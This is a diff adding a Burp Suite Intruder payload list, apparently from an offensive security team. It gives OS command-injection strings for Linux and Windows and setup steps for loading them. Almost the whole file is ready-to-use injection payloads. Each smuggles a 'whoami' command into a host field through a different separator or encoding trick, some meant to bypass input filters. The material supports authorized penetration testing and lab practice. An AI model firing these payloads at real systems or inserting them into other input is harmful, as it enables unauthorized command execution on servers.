@@ -1,0 +1,54 @@
+# ============================================================================
+# BURP SUITE INTRUDER PAYLOAD LIST
+# Tool    : Command Injection Pattern Generator
+# Author  : Offensive Team Zeta - ITSOLERA (PVT) LTD
+# Created : 2026-02-20 18:30:04
+# Target  : ALL OS patterns
+# Usage   : Burp Suite > Intruder > Payloads > Load > (this file)
+# WARNING : Use ONLY on authorized targets with written permission
+# NOTE    : These are NON-EXECUTABLE string templates only
+# ============================================================================
+
+# HOW TO USE:
+#   1. Open Burp Suite → Proxy → Intercept a request
+#   2. Right-click → Send to Intruder
+#   3. Intruder → Positions → mark your injection point (Add §)
+#   4. Intruder → Payloads → Payload type: Simple list
+#   5. Click Load → select this file
+#   6. Click Start Attack (authorized lab / DVWA ONLY)
+
+# ============================================================================
+# LINUX INJECTION PATTERNS
+# ============================================================================
+# [Separator: ;] Semicolon separator — runs second command unconditionally
+127.0.0.1 ; whoami
+# [Separator: &&] AND operator — runs second command only if first succeeds (exit 0)
+127.0.0.1 && whoami
+# [Separator: ||] OR operator — runs second command only if first fails (non-zero exit)
+invalid_host || whoami
+# [Separator: |] Pipe — output of first command is stdin of second
+127.0.0.1 | whoami
+# [Separator: `] Backtick substitution — executes and substitutes command output inline
+127.0.0.1 `whoami`
+# [Separator: $(] Dollar-paren substitution — POSIX alternative to backticks, nestable
+127.0.0.1 $(whoami)
+# [Separator: %0A] URL-encoded newline — shell interprets newline as command separator
+127.0.0.1%0Awhoami
+# [Separator: ${IFS}] Internal Field Separator abuse — replaces spaces to bypass space filters
+127.0.0.1;${IFS}whoami
+# ============================================================================
+# WINDOWS INJECTION PATTERNS
+# ============================================================================
+# [Separator: &] Windows ampersand — runs second command unconditionally (cmd.exe)
+127.0.0.1 & whoami
+# [Separator: &&] Windows AND — second command runs only if first succeeds
+127.0.0.1 && whoami
+# [Separator: ||] Windows OR — second command runs only if first fails
+invalid_host || whoami
+# [Separator: |] Windows pipe — stdout of first becomes stdin of second
+127.0.0.1 | whoami
+# [Separator: %0D%0A] CRLF encoded newline — cmd.exe treats CR+LF as command delimiter
+127.0.0.1%0D%0Awhoami
+# [Separator: ^&] Caret-escaped ampersand — cmd.exe caret is an escape character
+127.0.0.1 ^& whoami
+
